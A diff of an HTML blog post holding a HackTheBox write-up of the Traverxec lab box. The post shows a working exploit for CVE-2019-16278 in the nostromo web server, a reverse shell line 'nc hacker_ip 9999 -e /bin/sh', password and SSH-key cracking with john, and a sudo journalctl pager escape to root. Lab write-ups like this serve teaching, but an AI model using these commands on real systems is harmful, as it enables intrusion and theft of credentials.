@@ -26,56 +26,42 @@
 	<b>2020-04-16 15:39</b>
 	<div>
 		<p>This is the first box I have ever owned, so some steps might be sub-optimal,
-but I shall present how to own Traverxec own HackTheBox.</p>
-<p>My environment of choice for this is standard Debian. <code>user@host $</code>
+but I shall present how to own Traverxec own HackTheBox.</p><p>My environment of choice for this is standard Debian. <code>user@host $</code>
 means a shell as <code>user</code> on <code>host</code> (user is omitted on the hacker computer),
-<code>host #</code> means a root shell.</p>
-<h2>Step 1: External enumeration</h2>
-<p>Since on HTB all we get is an IP address, we first do a portscan against it.
-<pre>
-debian # nmap -Pn -sS -p- 10.10.10.165
+<code>host #</code> means a root shell.</p><h2> Step 1: External enumeration</h2><p>Since on HTB all we get is an IP address, we first do a portscan against it.
+</p><pre><code>debian # nmap -Pn -sS -p- 10.10.10.165
 Nmap scan report for 10.10.10.165
 Host is up (0.12s latency).
 Not shown: 65533 filtered ports
 PORT   STATE SERVICE
 22/tcp open  ssh
 80/tcp open  http
-</pre></p>
-<p>This box looks like a leightweight Linux webserver with only HTTP and SSH
+</code></pre><p>This box looks like a leightweight Linux webserver with only HTTP and SSH
 running. In this case I will go for HTTP first, while SSH may very well be
-a target, I suspect HTTP is much more likely.</p>
-<p>I first check if there is a website hosted using Firefox. We get something
+a target, I suspect HTTP is much more likely.</p><p>I first check if there is a website hosted using Firefox. We get something
 that looks like someone's personal website. Since the contact form does not
 work and the page looks like simple template with very few customizations,
 the only useful information we got from the page is the name <code>David White</code>.
-This could help us make educated guesses for the username later if necessary.</p>
-<p>Now I do a request to the web server using curl from the command line to get
+This could help us make educated guesses for the username later if necessary.</p><p>Now I do a request to the web server using curl from the command line to get
 some information about the software serving us this website.
-<pre>
-debian $ curl -v 10.10.10.165
+</p><pre><code>debian $ curl -v 10.10.10.165
 ...
-&lt; HTTP/1.1 200 OK
-&lt; Date: Thu, 16 Apr 2020 01:48:05 GMT
-<span style="color:red">&lt; Server: nostromo 1.9.6</span>
-&lt; Connection: close
-&lt; Last-Modified: Fri, 25 Oct 2019 21:11:09 GMT
-&lt; Content-Length: 15674
-&lt; Content-Type: text/html
+< HTTP/1.1 200 OK
+< Date: Thu, 16 Apr 2020 01:48:05 GMT
+<span style="color:red">< Server: nostromo 1.9.6</span>
+< Connection: close
+< Last-Modified: Fri, 25 Oct 2019 21:11:09 GMT
+< Content-Length: 15674
+< Content-Type: text/html
 ...
-</pre></p>
-<p>The line highlighted in red above rings many bells as nostromo is not a piece
+</code></pre><p>The line highlighted in red above rings many bells as nostromo is not a piece
 of software one commonly expects to see on Linux webservers. I have a version
-number and a package name, so it is time to search the web for changelogs.</p>
-<p>It turns out this specific version of nostromo, aka. nhttpd has a remote
-command injection vulnerability titled CVE-2019-16278.</p>
-<h2>Step 2: Exploting nostromo</h2>
-<p>There are some scripts online to exploit this, but since it looks trivial to
+number and a package name, so it is time to search the web for changelogs.</p><p>It turns out this specific version of nostromo, aka. nhttpd has a remote
+command injection vulnerability titled CVE-2019-16278.</p><h2> Step 2: Exploting nostromo</h2><p>There are some scripts online to exploit this, but since it looks trivial to
 implement I wrote quick shell script that exploits this. I prefer implementing
-my own exploits when feasible over using pre-made toolkits such as metasploit.</p>
-<p>This exploit relies on a path traversal protection bypass, which can be used
+my own exploits when feasible over using pre-made toolkits such as metasploit.</p><p>This exploit relies on a path traversal protection bypass, which can be used
 to request arbitrary files of the server.
-<pre>
-debian $ printf "GET /.%%0d./.%%0d./.%%0d./.%%0d./etc/passwd HTTP/1.0\r\n\r\n" | nc 10.10.10.165 80
+</p><pre><code>debian $ printf "GET /.%%0d./.%%0d./.%%0d./.%%0d./etc/passwd HTTP/1.0\r\n\r\n" | nc 10.10.10.165 80
 HTTP/1.1 200 OK
 Date: Thu, 16 Apr 2020 02:05:27 GMT
 Server: nostromo 1.9.6
@@ -87,25 +73,19 @@ root:x:0:0:root:/root:/bin/bash
 ...
 david:x:1000:1000:david,,,:/home/david:/bin/bash
 ...
-</pre></p>
-<p>Unfortunetly for the users of nostromo, and fortunetly for us this gets much
+</code></pre><p>Unfortunetly for the users of nostromo, and fortunetly for us this gets much
 worse when we <code>POST</code> instead of <code>GET</code>-ing. We can post commands to <code>/bin/sh</code>
 and instead of giving us the binary contents, the server executes it with
-<strong>our</strong> input, thus we gain remote command execution with the same permission
-as nostromo itself has.</p>
-<p>The following shell script implements this.
-<pre>
-#!/bin/sh
+**our** input, thus we gain remote command execution with the same permission
+as nostromo itself has.</p><p>The following shell script implements this.
+</p><pre><code>#!/bin/sh
 # Usage: rce.sh ip command
-printf "POST /.%%0d./.%%0d./.%%0d./.%%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n$2 2&gt;&amp;1\n" | nc $1 80
-</pre></p>
-<p>This might look very dense, but all we are doing is generating an HTTP request
+printf "POST /.%%0d./.%%0d./.%%0d./.%%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n$2 2>&1\n" | nc $1 80
+</code></pre><p>This might look very dense, but all we are doing is generating an HTTP request
 using printf into netcat with the body of the request being the command we
 intend to execute. The two <code>echo</code> commands are necessary for nostromo to
-return the output instead of failing with a <code>500 Internal Server Error</code>.</p>
-<p>Using our RCE script we get a reverse shell with nostromo's persmissions.
-<pre>
-First shell on hacker computer:
+return the output instead of failing with a <code>500 Internal Server Error</code>.</p><p>Using our RCE script we get a reverse shell with nostromo's persmissions.
+</p><pre><code>First shell on hacker computer:
 debian $ nc -lvp 9999
 www-data@traverxec $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -113,14 +93,10 @@ www-data@traverxec $ hostname
 traverxec<br>
 Second shell on hacker computer:
 debian $ ./rce.sh 10.10.10.165 "nc hacker_ip 9999 -e /bin/sh"
-</pre></p>
-<h2>Step 3: Owning david</h2>
-<p>Using the reverse shell from the last step I enumerate what can I access as
-<code>www-data</code>.</p>
-<p>Let's see what files can I access. Only interesting/unusual files are shown
+</code></pre><h2> Step 3: Owning david</h2><p>Using the reverse shell from the last step I enumerate what can I access as
+<code>www-data</code>.</p><p>Let's see what files can I access. Only interesting/unusual files are shown
 here, otherwise it would fill the page.
-<pre>
-www-data@traverxec $ find / -type f -readable
+</p><pre><code>www-data@traverxec $ find / -type f -readable
 ...
 /var/nostromo/logs/nhttpd.pid
 /var/nostromo/conf/mimes
@@ -132,31 +108,24 @@ www-data@traverxec $ find / -type f -readable
 /var/nostromo/htdocs/css/style.css
 /var/nostromo/htdocs/empty.html
 ...
-</pre></p>
-<p>First I check <code>.htpasswd</code>, which gets me a password hash for david.
-<pre>
-www-data@traverxec $ cat /var/nostromo/conf/.htpasswd
+</code></pre><p>First I check <code>.htpasswd</code>, which gets me a password hash for david.
+</p><pre><code>www-data@traverxec $ cat /var/nostromo/conf/.htpasswd
 david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
-</pre></p>
-<p>Since this is a weak MD5 hash, I let john the ripper run it through rockyou,
+</code></pre><p>Since this is a weak MD5 hash, I let john the ripper run it through rockyou,
 it comes back with <code>Nowonly4me</code> as the password. We could try these credentials,
-but lets look elsewhere first.</p>
-<p>I take a look at <code>nhttpd.conf</code> and it contains the following interesting section.
-<pre>
-www-data@traverxec $ cat /var/nostromo/conf/nhttpd.conf
+but lets look elsewhere first.</p><p>I take a look at <code>nhttpd.conf</code> and it contains the following interesting section.
+</p><pre><code>www-data@traverxec $ cat /var/nostromo/conf/nhttpd.conf
 ...
 # HOMEDIRS [OPTIONAL]<br>
 homedirs            /home
 homedirs_public     public_www
 ...
-</pre></p>
-<p>This tells nostromo to serve a directory from each user's home called
+</code></pre><p>This tells nostromo to serve a directory from each user's home called
 <code>public_www</code> under <code>/~username</code>. Since we know we have a user called <code>david</code>
 on the box, we open <code>http://10.10.10.165/~david/</code> in Firefox, and bingo we
 found <code>david</code>'s private area. After that we check <code>/home/david/public_www</code>
 as <code>find</code> must have missed it if <code>/home/david</code> itself is unreadable.
-<pre>
-www-data@traverxec $ find /home/david/public_www
+</p><pre><code>www-data@traverxec $ find /home/david/public_www
 /home/david/public_www
 /home/david/public_www/index.html
 /home/david/public_www/protected-file-area
@@ -167,19 +136,15 @@ home/david/.ssh/
 home/david/.ssh/authorized_keys
 home/david/.ssh/id_rsa
 home/david/.ssh/id_rsa.pub
-</pre></p>
-<p>As you can see above there are some very bad news for david as we found his
+</code></pre><p>As you can see above there are some very bad news for david as we found his
 ssh private key. We copy the tarball to a temporary location, extract it, and
 cat our id_rsa file to stdout.
-<pre>
-www-data@traverxec $ cp /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz /tmp/
+</p><pre><code>www-data@traverxec $ cp /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz /tmp/
 www-data@traverxec $ cd /tmp; tar xf backup-ssh-identity-files.tgz
 www-data@traverxec $ cat home/david/.ssh/id_rsa; rm -rf backup-ssh-identity-files.tgz home/
-</pre></p>
-<p>Looking at our newly acquired ssh key we can see it is password protected, but
+</code></pre><p>Looking at our newly acquired ssh key we can see it is password protected, but
 we can use john the ripper again to find the password and decrypt the key.
-<pre>
-debian $ ssh2john id_david &gt; id_david_hash
+</p><pre><code>debian $ ssh2john id_david > id_david_hash
 debian $ john --wordlist=rockyou.txt id_david_hash
 ...
 debian $ ssh-keygen -p -f id_david
@@ -187,18 +152,12 @@ Enter old passphrase: hunter
 Enter new passphrase (empty for no passphrase):
 Enter same passphrase again:
 Your identification has been saved with the new passphrase.
-</pre></p>
-<p>After this we just <code>ssh</code> in as <code>david</code> and get the flag.
-<pre>
-debian $ ssh -i id_david david@10.10.10.165
+</code></pre><p>After this we just <code>ssh</code> in as <code>david</code> and get the flag.
+</p><pre><code>debian $ ssh -i id_david david@10.10.10.165
 david@traverxec $ cat user.txt
 flag_will_be_here
-</pre></p>
-<h2>Step 4: Privilege escalation</h2>
-<p>Using the ssh connection we established above we look around the machine to see
-what <code>david</code> left on it.</p>
-<pre>
-david@traverxec $ find /home/david
+</code></pre><h2> Step 4: Privilege escalation</h2><p>Using the ssh connection we established above we look around the machine to see
+what <code>david</code> left on it.</p><p></p><pre><code>david@traverxec $ find /home/david
 /home/david
 /home/david/.local
 /home/david/.local/share
@@ -220,36 +179,29 @@ david@traverxec $ find /home/david
 /home/david/.bash_logout
 /home/david/.bashrc
 /home/david/user.txt
-</pre>
-
-<p>Next I look at the shell script highlited above. Running the script prints some
-of the webserver log, but most importantly does <strong>not</strong> require a password to do
+</code></pre><p>Next I look at the shell script highlited above. Running the script prints some
+of the webserver log, but most importantly does **not** require a password to do
 it. Now we look at the code and see why.
-<pre>
-david@traverxec $ cat /home/david/bin/server-stats.sh
+</p><pre><code>david@traverxec $ cat /home/david/bin/server-stats.sh
 #!/bin/bash<br>
 cat /home/david/bin/server-stats.head
-echo "Load: <code>/usr/bin/uptime</code>"
+echo "Load: `/usr/bin/uptime`"
 echo " "
-echo "Open nhttpd sockets: <code>/usr/bin/ss -H sport = 80 | /usr/bin/wc -l</code>"
-echo "Files in the docroot: <code>/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l</code>"
+echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
+echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
 echo " "
 echo "Last 5 journal log lines:"
 /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
-</pre></p>
-<p>As you can see <code>david</code> allowed himself to run <code>journalctl</code> as <code>root</code>. Sadly for
+</code></pre><p>As you can see <code>david</code> allowed himself to run <code>journalctl</code> as <code>root</code>. Sadly for
 him <code>journalctl</code> calls a pager if it's output does not fit inside the terminal.
 Thus we make our terminal window tiny, and run the <code>journalctl</code> command.
-<pre>
-david@traverxec $ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-</pre>
-Now we have <code>less</code> running as <code>root</code> under our control. Since it has a convenient
+</p><pre><code>david@traverxec $ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+</code></pre><p>Now we have <code>less</code> running as <code>root</code> under our control. Since it has a convenient
 <code>vim</code>-like command execution feature we just type <code>!/bin/sh</code> and we have a <code>root</code>
 shell. Now we just <code>cat</code> the root flag and we are done ;)
-<pre>
-travrexec # cat /root/root.txt
+</p><pre><code>travrexec # cat /root/root.txt
 root_flag_here
-</pre></p>
+</code></pre>
 	</div>
 </body>
 </html>
